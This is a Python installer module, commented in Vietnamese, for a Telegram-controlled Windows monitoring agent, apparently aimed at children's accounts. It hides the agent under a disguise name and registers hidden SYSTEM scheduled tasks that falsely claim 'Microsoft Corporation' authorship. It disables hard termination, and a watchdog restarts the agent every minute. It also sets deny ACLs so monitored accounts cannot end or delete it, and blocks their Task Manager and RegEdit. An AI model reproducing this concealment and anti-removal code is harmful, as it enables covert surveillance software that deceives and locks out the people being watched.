"""Cai dat / go cai dat agent tren Windows.

Cau truc sau khi cai (ten thu muc = stealth.display_name, mac dinh SysHealthAgent):

    C:\\Program Files\\SysHealthAgent\\bin\\agent.exe|python -m remotepc
                                    \\bin\\ui\\     (uihost - tai khoan con doc duoc)
    C:\\ProgramData\\SysHealthAgent\\config.json    (Users: bi chan hoan toan)
                                     \\ipc\\outbox   (Users: chi doc)
                                     \\ipc\\inbox    (Users: chi tao file)
                                     \\shots         (Users: chi tao file, khong doc)

4 scheduled task (tat ca `Hidden`, `AllowHardTerminate=false`):
    <Name>             guardian  - SYSTEM - chay khi bat may
    <Name> UI          uihost    - nguoi dung dang nhap - chay khi logon
    <Name> Watchdog    SYSTEM    - moi 1 phut: neu guardian chet thi day len
    <Name> Telemetry   SYSTEM    - trigger theo su kien 1074: bao "may dang tat"

Tai khoan con bi chan: End Task (DENY ACE + process thuoc SYSTEM), xoa file (ACL),
tat task (ACL tren C:\\Windows\\System32\\Tasks), va Task Manager/RegEdit (policy HKCU).
"""

from __future__ import annotations

import logging
import os
import shutil
import subprocess
import sys
import time
from pathlib import Path
from typing import Optional

from . import __version__
from .config import Config, save_config
from .paths import IS_WINDOWS, Layout, is_frozen, repo_root

log = logging.getLogger("remotepc.installer")

TASK_SUFFIX_WATCHDOG = "Watchdog"
TASK_SUFFIX_UI = "UI"
TASK_SUFFIX_TELEMETRY = "Telemetry"

EVENT_1074_QUERY = (
    "&lt;QueryList&gt;&lt;Query Id=\"0\" Path=\"System\"&gt;"
    "&lt;Select Path=\"System\"&gt;*[System[EventID=1074]]&lt;/Select&gt;"
    "&lt;/Query&gt;&lt;/QueryList&gt;"
)


# --------------------------------------------------------------------------- #
# Tien ich
# --------------------------------------------------------------------------- #


def run(cmd: list[str], timeout: int = 90) -> tuple[bool, str]:
    try:
        flags = getattr(subprocess, "CREATE_NO_WINDOW", 0) if IS_WINDOWS else 0
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout,
                           encoding="utf-8", errors="replace", creationflags=flags)
        out = ((p.stdout or "") + ("\n" + p.stderr if p.stderr else "")).strip()
        return p.returncode == 0, out
    except FileNotFoundError as e:
        return False, f"Khong tim thay lenh: {e}"
    except (subprocess.SubprocessError, OSError) as e:
        return False, f"{type(e).__name__}: {e}"


def is_elevated() -> bool:
    from .system_info import is_admin
    return is_admin()


def task_names(cfg: Config) -> dict[str, str]:
    base = cfg.stealth.display_name.strip() or "SysHealthAgent"
    return {
        "guardian": base,
        "uihost": f"{base} {TASK_SUFFIX_UI}",
        "watchdog": f"{base} {TASK_SUFFIX_WATCHDOG}",
        "telemetry": f"{base} {TASK_SUFFIX_TELEMETRY}",
    }


def guardian_task_name(cfg: Config) -> str:
    return task_names(cfg)["guardian"]


def uihost_task_name(cfg: Config) -> str:
    return task_names(cfg)["uihost"]


def run_task(name: str) -> tuple[bool, str]:
    return run(["schtasks", "/run", "/tn", name], timeout=30)


def task_exists(name: str) -> bool:
    ok, _ = run(["schtasks", "/query", "/tn", name], timeout=30)
    return ok


def delete_task(name: str) -> tuple[bool, str]:
    return run(["schtasks", "/delete", "/tn", name, "/f"], timeout=30)


def pythonw_exe() -> str:
    """pythonw.exe (khong hien console) - fallback python.exe."""
    cur = Path(sys.executable)
    cand = cur.with_name("pythonw.exe")
    if cand.exists():
        return str(cand)
    return str(cur)


def program_command(cfg: Config, install_root: Path, mode: str) -> tuple[str, str, str]:
    """(Command, Arguments, WorkingDirectory) cho scheduled task.

    Luon truyen `--config <duong dan that>` vi ten thu muc du lieu phu thuoc
    vao ten nguy trang (ma agent chua biet truoc khi doc config).
    """
    cfg_arg = f'--config "{cfg.data_layout_dir() / "config.json"}"'

    if is_frozen():
        bin_dir = install_root / "bin"
        agent_exe = bin_dir / Path(sys.executable).name
        ui_exe = bin_dir / "ui" / (cfg.stealth.uihost_name + ".exe")
        if not agent_exe.exists():
            agent_exe = Path(sys.executable)          # chay truc tiep tu thu muc build
        if mode == "uihost":
            if ui_exe.exists():
                return str(ui_exe), cfg_arg, str(ui_exe.parent)
            return str(agent_exe), f"{cfg_arg} uihost", str(agent_exe.parent)
        return str(agent_exe), f"{cfg_arg} {mode_arg(mode)}".strip(), str(agent_exe.parent)

    # Chay tu source: copy ca goi remotepc vao install_root\bin
    py = pythonw_exe() if mode in ("run", "uihost") else sys.executable
    pkg = install_root / "bin"
    return py, f"-m remotepc {cfg_arg} {mode_arg(mode)}".strip(), str(pkg)


def mode_arg(mode: str) -> str:
    return {"run": "run", "uihost": "uihost", "watchdog": "watchdog",
            "notify": "notify-shutdown"}.get(mode, mode)


# --------------------------------------------------------------------------- #
# XML cua scheduled task
# --------------------------------------------------------------------------- #


def _task_xml(*, description: str, command: str, arguments: str, workdir: str,
              trigger: str, principal: str, restart_minutes: int = 1) -> str:
    args = f"<Arguments>{_xml_esc(arguments)}</Arguments>" if arguments.strip() else ""
    wd = f"<WorkingDirectory>{_xml_esc(workdir)}</WorkingDirectory>" if workdir else ""
    return f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>{_xml_esc(description)}</Description>
    <Author>Microsoft Corporation</Author>
    <Version>{__version__}</Version>
  </RegistrationInfo>
  <Triggers>
{trigger}
  </Triggers>
  <Principals>
    <Principal id="Author">
{principal}
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure>
      <Interval>PT{restart_minutes}M</Interval>
      <Count>999</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{_xml_esc(command)}</Command>
      {args}
      {wd}
    </Exec>
  </Actions>
</Task>
'''


def _xml_esc(text: str) -> str:
    return (str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
            .replace('"', "&quot;"))


SYSTEM_PRINCIPAL = "      <UserId>S-1-5-18</UserId>"
USERS_PRINCIPAL = "      <GroupId>S-1-5-32-545</GroupId>"

BOOT_TRIGGER = '''    <BootTrigger>
      <Enabled>true</Enabled>
      <Delay>PT10S</Delay>
    </BootTrigger>'''

LOGON_TRIGGER = '''    <LogonTrigger>
      <Enabled>true</Enabled>
      <Delay>PT5S</Delay>
    </LogonTrigger>'''


def watchdog_trigger(start: Optional[str] = None) -> str:
    start = start or "2020-01-01T00:00:00"
    return f'''    <TimeTrigger>
      <StartBoundary>{start}</StartBoundary>
      <Enabled>true</Enabled>
      <Repetition>
        <Interval>PT1M</Interval>
      </Repetition>
    </TimeTrigger>'''



def event_trigger(subscription: str) -> str:
    return f'''    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>{subscription}</Subscription>
    </EventTrigger>'''


# --------------------------------------------------------------------------- #
# Sao chep chuong trinh
# --------------------------------------------------------------------------- #


def _copy_program(install_root: Path, cfg: Config) -> list[str]:
    """Copy exe (neu frozen) hoac source package vao install_root/bin."""
    notes: list[str] = []
    bin_dir = install_root / "bin"
    ui_dir = bin_dir / "ui"
    for d in (bin_dir, ui_dir):
        d.mkdir(parents=True, exist_ok=True)

    if is_frozen():
        src = Path(sys.executable)
        dst = bin_dir / src.name
        shutil.copy2(src, dst)
        notes.append(f"Đã copy {src.name} → {dst}")
        ui_src = src.with_name(cfg.stealth.uihost_name + ".exe")
        if ui_src.exists():
            shutil.copy2(ui_src, ui_dir / ui_src.name)
            notes.append(f"Đã copy {ui_src.name} → {ui_dir}")
        return notes

    pkg_src = repo_root() / "remotepc"
    if not pkg_src.exists():
        pkg_src = Path(__file__).resolve().parent
    pkg_dst = bin_dir / "remotepc"
    if pkg_dst.exists():
        shutil.rmtree(pkg_dst, ignore_errors=True)
    shutil.copytree(pkg_src, pkg_dst, ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))
    notes.append(f"Đã copy gói `remotepc` → {pkg_dst}")
    for extra in ("requirements.txt",):
        f = repo_root() / extra
        if f.exists():
            shutil.copy2(f, bin_dir / extra)
    # uihost dung chung file chay, chi khac thu muc (de phan quyen)
    (ui_dir / "README.txt").write_text(
        "UI host dung chung package trong ..\\ (xem scheduled task).", encoding="utf-8")
    return notes


def _write_launcher(install_root: Path, cfg: Config) -> None:
    """File .cmd de bo me chay tay khi can (an trong thu muc bin)."""
    bin_dir = install_root / "bin"
    bin_dir.mkdir(parents=True, exist_ok=True)
    cmd, args, wd = program_command(cfg, install_root, "run")
    (bin_dir / "service.cmd").write_text(
        "@echo off\r\n"
        f'cd /d "{wd}"\r\n'
        f'"{cmd}" {args}\r\n', encoding="utf-8")


# --------------------------------------------------------------------------- #
# Phan quyen (ACL)
# --------------------------------------------------------------------------- #


def _apply_acls(cfg: Config, layout: Layout, install_root: Path, children: list[str]) -> list[str]:
    notes: list[str] = []
    if not IS_WINDOWS:
        os.chmod(layout.config_file, 0o600) if layout.config_file.exists() else None
        notes.append("(Không phải Windows: bỏ qua ACL)")
        return notes

    # 0) Dam bao tat ca thu muc can thiet ton tai truoc khi ap dung ACL
    for sub in (layout.base, layout.ipc_dir, layout.outbox_dir, layout.inbox_dir, layout.shots_dir):
        try:
            sub.mkdir(parents=True, exist_ok=True)
        except OSError:
            pass
    ui_dir = install_root / "bin" / "ui"
    try:
        ui_dir.mkdir(parents=True, exist_ok=True)
    except OSError:
        pass

    # 1) Thu muc du lieu (layout.base):
    # Chi SYSTEM + Administrators giu toan quyen. Users bi loai khoi DACL (/inheritance:r).
    run(["icacls", str(layout.base), "/inheritance:r",
         "/grant", "SYSTEM:(OI)(CI)(F)", "/grant", "*S-1-5-32-544:(OI)(CI)(F)"])
    for acct in children:     # neu co danh sach tai khoan con, chan them de chac chan
        if acct:
            run(["icacls", str(layout.base), "/deny", f"{acct}:(OI)(CI)(R,W,D,RX)"])
    notes.append(f"Đã khoá {layout.base} (chỉ SYSTEM và Administrators)")

    # 2) ipc: cho phep Users vao ipc/ de den outbox va inbox
    run(["icacls", str(layout.ipc_dir), "/grant", "*S-1-5-32-545:(OI)(CI)(RX)"])
    for sub, grants, denies in (
        (layout.outbox_dir, ["*S-1-5-32-545:(OI)(CI)(RX)"], []),
        (layout.inbox_dir, ["*S-1-5-32-545:(OI)(CI)(W,WD,AD,WA)"], ["*S-1-5-32-545:(OI)(CI)(R,D)"]),
        (layout.shots_dir, ["*S-1-5-32-545:(OI)(CI)(W,WD,AD,WA)"], ["*S-1-5-32-545:(OI)(CI)(R,D)"]),
    ):
        run(["icacls", str(sub), "/inheritance:r",
             "/grant", "SYSTEM:(OI)(CI)(F)", "/grant", "*S-1-5-32-544:(OI)(CI)(F)"])
        for g in grants:
            run(["icacls", str(sub), "/grant", g])
        for d in denies:
            run(["icacls", str(sub), "/deny", d])
    notes.append("Đã phân quyền ipc/ (outbox: chỉ đọc · inbox, shots: chỉ ghi)")

    # 3) Thu muc chuong trinh:
    run(["icacls", str(install_root), "/inheritance:r",
         "/grant", "SYSTEM:(OI)(CI)(F)", "/grant", "*S-1-5-32-544:(OI)(CI)(F)"])
    run(["icacls", str(ui_dir), "/grant", "*S-1-5-32-545:(OI)(CI)(RX)"])
    if not is_frozen():
        # uihost chay tu package trong bin\ -> phai cho Users doc package
        run(["icacls", str(install_root / "bin"), "/grant", "*S-1-5-32-545:(RX)"])
        pkg_dir = install_root / "bin" / "remotepc"
        if pkg_dir.exists():
            run(["icacls", str(pkg_dir), "/grant", "*S-1-5-32-545:(OI)(CI)(RX)"])
            run(["icacls", str(pkg_dir), "/deny", "*S-1-5-32-545:(OI)(CI)(W,D)"])
    notes.append(f"Đã khoá {install_root}\\bin (chỉ SYSTEM/Admin)")

    # 4) Chan con tac dong vao scheduled task
    if children:
        tasks_dir = Path(os.environ.get("SystemRoot", r"C:\Windows")) / "System32" / "Tasks"
        for name in task_names(cfg).values():
            for acct in children:
                if acct:
                    target = tasks_dir / name.replace(" ", "_")
                    for cand in (tasks_dir / name, target):
                        if cand.exists():
                            run(["icacls", str(cand), "/deny", f"{acct}:(R,W,D,X)"])
        notes.append("Đã chặn tài khoản con trên file scheduled task")
    return notes


# --------------------------------------------------------------------------- #
# Policy cho tai khoan con
# --------------------------------------------------------------------------- #


def detect_children(explicit: Optional[list[str]] = None) -> list[str]:
    """Danh sach tai khoan can bao ve (mac dinh: moi tai khoan khong phai Admin)."""
    if explicit:
        return [a for a in explicit if a]
    if not IS_WINDOWS:
        return []
    from .stealth import non_admin_accounts
    skip = {"defaultaccount", "guest", "wdagutilityaccount", "default", "administrator"}
    return [a for a in non_admin_accounts() if a.lower() not in skip]


# --------------------------------------------------------------------------- #
# CAI DAT
# --------------------------------------------------------------------------- #


def install(cfg: Config, cfg_path: Path, level: Optional[int] = None,
            children: Optional[list[str]] = None, start_now: bool = True,
            create_tasks: bool = True) -> tuple[bool, list[str]]:
    """Cai agent: copy file, phan quyen, tao task, ap policy, khoi dong."""
    notes: list[str] = []
    if level is not None:
        cfg.stealth.level = int(level)
    child_list = detect_children(children)
    cfg.stealth.deny_terminate_accounts = sorted(set(child_list)) if not cfg.stealth.deny_terminate_accounts \
        else cfg.stealth.deny_terminate_accounts
    notes.append(f"Tài khoản bị quản lý: {', '.join(child_list) or '(không phát hiện được)'}")

    if IS_WINDOWS and not is_elevated():
        return False, notes + ["❌ Cần chạy bằng quyền Administrator (Run as administrator)."]

    install_root = cfg.install_layout_dir()
    layout = Layout(cfg.data_layout_dir())
    layout.ensure()

    # 1) config
    target_cfg = layout.config_file
    if Path(cfg_path).resolve() != target_cfg.resolve():
        save_config(cfg, target_cfg)
        notes.append(f"Đã ghi cấu hình → {target_cfg}")
    cfg.data_dir = str(layout.base)
    cfg.install_dir = str(install_root)
    cfg.installed = True
    save_config(cfg, target_cfg)

    # 2) copy chuong trinh
    install_root.mkdir(parents=True, exist_ok=True)
    notes += _copy_program(install_root, cfg)
    _write_launcher(install_root, cfg)

    # 3) scheduled task
    if create_tasks and IS_WINDOWS:
        notes += _create_tasks(cfg, install_root, layout)
    elif create_tasks:
        notes.append("(Không phải Windows: bỏ qua scheduled task)")

    # 4) ACL
    notes += _apply_acls(cfg, layout, install_root, child_list)

    # 5) policy rieng cho tai khoan con
    if IS_WINDOWS and cfg.stealth.level >= 2 and child_list:
        from .stealth import apply_child_policies
        res = apply_child_policies(child_list, level=cfg.stealth.level,
                                   block_taskmgr=cfg.stealth.block_task_manager_for_child,
                                   block_regedit=cfg.stealth.block_regedit_for_child)
        notes += [f"Policy: {r}" for r in res]

    # 6) khoi dong
    if start_now:
        names = task_names(cfg)
        if IS_WINDOWS and create_tasks:
            ok, out = run_task(names["guardian"])
            notes.append(f"Đã khởi động guardian: {out[-120:] or 'OK'}")
            time.sleep(1)
            ok, out = run_task(names["uihost"])
            notes.append(f"Đã khởi động UI host: {out[-120:] or 'OK'}")
        else:
            notes.append("Hãy chạy: `python -m remotepc run` (nền: `pythonw -m remotepc run`)")

    return True, notes


def _create_tasks(cfg: Config, install_root: Path, layout: Layout) -> list[str]:
    notes: list[str] = []
    names = task_names(cfg)
    tmp = Path(os.environ.get("TEMP", "/tmp"))

    jobs = []
    cmd, args, wd = program_command(cfg, install_root, "run")
    jobs.append((names["guardian"], cfg.stealth.description, cmd, args, wd,
                 BOOT_TRIGGER, SYSTEM_PRINCIPAL))

    cmd_ui, args_ui, wd_ui = program_command(cfg, install_root, "uihost")
    jobs.append((names["uihost"], cfg.stealth.description + " (UI)", cmd_ui, args_ui, wd_ui,
                 LOGON_TRIGGER, USERS_PRINCIPAL))

    cmd_w, args_w, wd_w = program_command(cfg, install_root, "watchdog")
    jobs.append((names["watchdog"], cfg.stealth.description + " (Watchdog)", cmd_w, args_w, wd_w,
                 watchdog_trigger(), SYSTEM_PRINCIPAL))

    cmd_t, args_t, wd_t = program_command(cfg, install_root, "notify")
    jobs.append((names["telemetry"], cfg.stealth.description + " (Telemetry)", cmd_t, args_t, wd_t,
                 event_trigger(EVENT_1074_QUERY), SYSTEM_PRINCIPAL))

    # Ban sao XML duoc giu lai de watchdog co the tao lai task neu bi xoa
    backup = layout.base / "tasks"
    backup.mkdir(parents=True, exist_ok=True)

    for (name, desc, command, arguments, workdir, trigger, principal), role in zip(jobs, (
            "guardian", "uihost", "watchdog", "telemetry")):
        xml = _task_xml(description=desc, command=command, arguments=arguments,
                        workdir=workdir, trigger=trigger, principal=principal)
        f = tmp / f"rp-task-{abs(hash(name)) % 10**8}.xml"
        try:
            f.write_text(xml, encoding="utf-16")
            ok, out = run(["schtasks", "/create", "/tn", name, "/xml", str(f), "/f"], timeout=60)
            notes.append(f"{'OK ' if ok else 'LOI'} Task `{name}`: {out[-160:] or 'OK'}")
            if ok:
                try:
                    (backup / f"{role}.xml").write_text(xml, encoding="utf-8")
                except OSError:
                    pass
        finally:
            try:
                f.unlink(missing_ok=True)
            except OSError:
                pass
    return notes


# --------------------------------------------------------------------------- #
# GO CAI DAT
# --------------------------------------------------------------------------- #


def uninstall(cfg: Config, cfg_path: Path, layout: Layout, purge: bool = True,
              children: Optional[list[str]] = None) -> tuple[bool, str]:
    notes: list[str] = []
    if IS_WINDOWS and not is_elevated():
        return False, "Cần quyền Administrator để gỡ."

    names = task_names(cfg)
    for name in names.values():
        run(["schtasks", "/end", "/tn", name], timeout=20)
        ok, out = delete_task(name)
        notes.append(f"Task `{name}`: {'đã xoá' if ok else (out[-80:] or 'không tồn tại')}")

    # Tat process con sot
    if IS_WINDOWS:
        for exe in {Path(sys.executable).name, cfg.stealth.uihost_name + ".exe",
                    cfg.stealth.display_name + ".exe"}:
            run(["taskkill", "/f", "/im", exe], timeout=20)

    # Bo policy cua con
    child_list = children if children is not None else list(cfg.stealth.deny_terminate_accounts or [])
    if IS_WINDOWS and child_list:
        from .stealth import remove_child_policies
        notes += remove_child_policies(child_list)

    install_root = cfg.install_layout_dir()
    for target in (install_root, layout.base):
        if not Path(target).exists():
            continue
        if IS_WINDOWS:
            run(["takeown", "/f", str(target), "/r", "/d", "y"], timeout=120)
            run(["icacls", str(target), "/reset", "/t", "/c"], timeout=120)
            run(["icacls", str(target), "/grant", "*S-1-5-32-544:(OI)(CI)(F)", "/t", "/c"], timeout=120)
        if purge:
            shutil.rmtree(target, ignore_errors=True)
            notes.append(f"Đã xoá {target}")
        else:
            notes.append(f"Đã giữ lại {target} (--purge để xoá hẳn)")

    # Tra quyen task dir (neu da deny)
    if IS_WINDOWS:
        tasks_dir = Path(os.environ.get("SystemRoot", r"C:\Windows")) / "System32" / "Tasks"
        for name in names.values():
            for cand in (tasks_dir / name, tasks_dir / name.replace(" ", "_")):
                if cand.exists():
                    run(["icacls", str(cand), "/reset"], timeout=20)

    return True, "\n".join(notes)


# --------------------------------------------------------------------------- #
# KIEM TRA (doctor)
# --------------------------------------------------------------------------- #


def doctor(cfg: Config, layout: Layout) -> list[str]:
    """Tu kiem tra lop bao ve, tra ve danh sach dong trang thai."""
    from . import system_info
    from .uihost import InboxReader

    out: list[str] = []
    out.append(f"Phiên bản: {__version__}")
    out.append(f"Chạy với quyền admin: {'CÓ' if is_elevated() else 'KHÔNG'}")
    out.append(f"Session 0 (SYSTEM): {'CÓ' if system_info.is_session_zero() else 'KHÔNG'}")
    out.append(f"Data dir: {layout.base} ({'tồn tại' if layout.base.exists() else 'THIẾU'})")
    out.append(f"Config: {layout.config_file} ({'OK' if layout.config_file.exists() else 'THIẾU'})")
    out.append(f"Bot token: {'đã cấu hình' if cfg.telegram.bot_token else 'THIẾU'}")
    out.append(f"Chat được phép: {cfg.telegram.allowed_chat_ids or 'CHƯA CÓ (gửi /pair <PIN> cho bot)'}")
    out.append(f"PIN: {'đã đặt' if cfg.has_pin() else 'CHƯA đặt'}")
    out.append(f"Mức bảo vệ: {cfg.stealth.level}")
    if IS_WINDOWS:
        for name in task_names(cfg).values():
            out.append(f"Task `{name}`: {'✅ có' if task_exists(name) else '❌ không có'}")
        pid_file = layout.base / "agent.pid"
        if pid_file.exists():
            out.append(f"PID file: {pid_file.read_text(encoding='utf-8')[:120]}")
        else:
            out.append("PID file: chưa có (agent chưa chạy?)")
    reader = InboxReader(layout)
    out.append(f"UI host: {'✅ đang chạy' if reader.uihost_alive() else '❌ không thấy tín hiệu'}")
    return out
